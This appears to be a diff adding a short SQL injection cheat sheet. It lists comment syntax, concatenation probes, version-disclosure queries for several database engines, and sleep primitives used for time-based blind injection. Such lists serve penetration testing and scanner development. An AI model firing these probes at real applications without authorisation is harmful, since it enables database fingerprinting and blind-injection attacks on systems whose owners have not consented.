@@ -1,0 +1,23 @@
+# Comments
+-- 
+/* ... */
+# (MySQL only)
+
+# Concat probes
+'a'||'b'
+'a'+'b'
+CONCAT('a','b')
+'a' 'b'
+
+# Version
+SELECT @@version
+SELECT version()
+SELECT banner FROM v$version
+SELECT version FROM v$instance
+
+# Sleep primitives
+SELECT SLEEP(5)
+WAITFOR DELAY '0:0:5'
+SELECT pg_sleep(5)
+SELECT dbms_pipe.receive_message(('a'),5) FROM dual
+
